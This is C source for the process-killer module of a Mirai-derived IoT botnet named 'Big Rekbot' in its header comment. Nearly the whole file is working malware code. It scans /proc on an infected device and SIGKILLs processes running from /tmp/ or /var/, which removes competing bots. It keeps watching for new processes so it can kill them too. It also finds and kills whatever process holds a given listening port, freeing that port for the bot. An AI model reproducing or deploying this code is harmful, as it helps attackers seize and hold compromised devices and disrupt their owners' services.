#define _GNU_SOURCE

/**Big Rekbot source**/

#include <stdlib.h>
#include <dirent.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <netinet/in.h>

#include "includes.h"
#include "util.h"
#include "table.h"
#include "killer.h"

void ChangePath(char* f, char* p, char* a) // Change scanning path between /exe and /maps.
{
    strcpy(f, "/proc/");
    strcat(f, p);
    strcat(f, a);
}

// This is RetrieveBuffer(...) but split into two different functions for sexy style
int ExeBuffer(char* cwd, char* path, char* sub)
{
    int r;
    ChangePath(path, sub, "/exe");

    if ((r = readlink(path, cwd, 1024)) < 1)
        return -1;

    cwd[r] = 0;
    return r;
}

int MapBuffer(char* cwd, char* path, char* sub)
{
    int fd, ret;
    ChangePath(path, sub, "/maps");

    if ((fd = open(path, O_RDONLY)) < 0)
        return -1;

    if (read(fd, cwd, 1024) < 1)
    {
        close(fd);
        return -1;
    }

    // Retrieve position of "[heap]" in /maps to zero out the stack includes in the buffer and only keep our heap executions
    ret = mem_exists(cwd, "[heap]");
    if (ret != -1) cwd[ret] = 0;
    else
    {
        ret = mem_exists(cwd, "r--p"); // Im going to prison for this...
        if (ret != -1) cwd += ret;

        ret = mem_exists(cwd, "rw-p");
        if (ret != -1) cwd[ret] = 0;
    }

    close(fd);
    return 1;
}

// Not sure if we should actually use this method.
int NumaMapBuffer(char* cwd, char* path, char* sub)
{
    int fd;
    ChangePath(path, sub, "/numa_maps");

    if ((fd = open(path, O_RDONLY)) < 0)
        return -1;

    if (read(fd, cwd, 1024) == -1)
    {
        close(fd);
        return -1;
    }

    getPOS(cwd, "default");

    close(fd);
    return 1;
}

int self = 0;
char *SelfBuffer = {0};

void KillProccess()
{
    int scans_timeout = 0, PidsKilled = 0, ExeSelf;
    struct dirent *subFolder = NULL;
    //char *exe = exes += 2;
    DIR *dir;

    if(self == 0)
    {
        char *SelfPath = "/proc/self/exe";
        ExeSelf = open(SelfPath, O_RDONLY);
        if (ExeSelf > 0)
        {
            close(ExeSelf);
            readlink(SelfPath, SelfBuffer, 100);
            self = 1;
        }
    }

    while(TRUE)
    {
        scans_timeout++;

        if ((dir = opendir("/proc/")) == NULL)
            break;

        while ((subFolder = readdir(dir)) != NULL)
        {
            int pid = atoi(subFolder->d_name), exea = 0;
            char path[512], cwd[2048];

            if(pid == mainpid || pid == maintain_thread)
                continue;

            if (*(subFolder->d_name) < '0' || *(subFolder->d_name) > '9')
                continue;

            while(exea != 3)
            {
                memset(&path, 0, 512);
                memset(&cwd, 0, 2048);

                if (exea == 0)
                {
                    if(ExeBuffer(cwd, path, subFolder->d_name) == -1)
                        break;
                }
                if (exea == 1)
                {
                    if(MapBuffer(cwd, path, subFolder->d_name) == -1)
                        break;
                }
                if (exea == 2)
                {
                    if(NumaMapBuffer(cwd, path, subFolder->d_name) == -1)
                        break;
                }

                if(mem_exists(cwd, "/tmp/") != -1 || mem_exists(cwd, "/var/") != -1)
                {
                    #ifdef RBOT
                    if(scans_timeout == 1)
                    {
                        PidsKilled++;
                        DEBUG_PRINT("Killed [%s] Count: [%d] Exea: [%d] [%s]\r\n", path, PidsKilled, exea, cwd);
                    }
                    #else
                    PidsKilled++;
                    kill(pid, 9);
                    #endif

                    break;
                }

                exea++;
            }
        }

        closedir(dir);
        if(scans_timeout == 1)
            break;
    }

    DEBUG_PRINT("Killed [%d] pid(s)\r\n", PidsKilled);
}

void process_killer()
{
    #ifndef RBOT
    maintain_thread = fork();
    if( maintain_thread > 0 || maintain_thread == -1 )
        return;
    #endif

    /* We want to kill all process as soon as we access the device. */
    KillProccess();

    /* Then listen to /proc/ for new processes being created. As soon as we detect one. We attempt to kill it. */
    while(TRUE)
    {
        int BaseScan = 0, UpdatedScan = 0, TotalScans = 0;
        struct dirent *subFolder = NULL;
        DIR *dir;

        if ((dir = opendir("/proc/")) == NULL)
            break;

        while ((subFolder = readdir(dir)) != NULL)
            BaseScan++;

        closedir(dir);
        while(TRUE)
        {
            UpdatedScan = 0;
            TotalScans++;

            if ((dir = opendir("/proc/")) == NULL)
                break;

            while ((subFolder = readdir(dir)) != NULL) UpdatedScan++;

            if (BaseScan > UpdatedScan)
            {
                KillProccess();
                DEBUG_PRINT("BaseScan: [%d] | UpdatedScan: [%d]\r\n", BaseScan, UpdatedScan);
                DEBUG_PRINT("Detected [%d] PIDS were removed. Updating BaseScan.\r\n", BaseScan - UpdatedScan);

                closedir(dir);
                break;
            }

            if (BaseScan < UpdatedScan)
            {
                DEBUG_PRINT("BaseScan: [%d] | UpdatedScan: [%d]\r\n", BaseScan, UpdatedScan);
                DEBUG_PRINT("Detected [%d] new PIDS were created. Attempting to kill, then update BaseScan.\r\n", UpdatedScan - BaseScan);

                KillProccess();
                closedir(dir);
                break;
            }

            closedir(dir);
            if(TotalScans == 10)
            {
                DEBUG_PRINT("BaseScan: [%d] | UpdatedScan: [%d]\r\n", BaseScan, UpdatedScan);

                sleep(1);
                TotalScans = 0;
            }
        }
    }
}

int getPOS(char *buf, char*str)
{
    int g = strlen(str) -1, f = 0, ret = 0;

    if((ret = mem_exists(buf, ".so")) != -1) buf[ret] = 0;
    else return -1;

    for (f = strlen(buf); f > -1; f--)
    {
        if(g == 0)
        {
            buf[f] = 0;
            return f;
        }

        if(buf[f] == str[g])
        {
            g--;
            continue;
        }
        g = strlen(str) - 1;
    }

    return -1;
}

int mem_exists(char *buf, char *str)
{
	int f = 0, g = 0;

    for(f = 0; f < strlen(buf); f++)
    {
        if(g == strlen(str))
            return f;

        if(buf[f] == str[g])
        {
            g++;
            continue;
        }
        g = 0;
    }

    return -1;
}


BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
	table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
		table_lock_val(TABLE_KILLER_TCP);
        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    memset(exe, 0, PATH_MAX);

                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        //printf("[killer] Found pid %d for port %d\n", atoi(pid), ntohs(port));
						//kill(atoi(pid), 9);

#else
                        kill(atoi(pid), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }


    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
	table_lock_val(TABLE_KILLER_TCP);


    return ret;
}
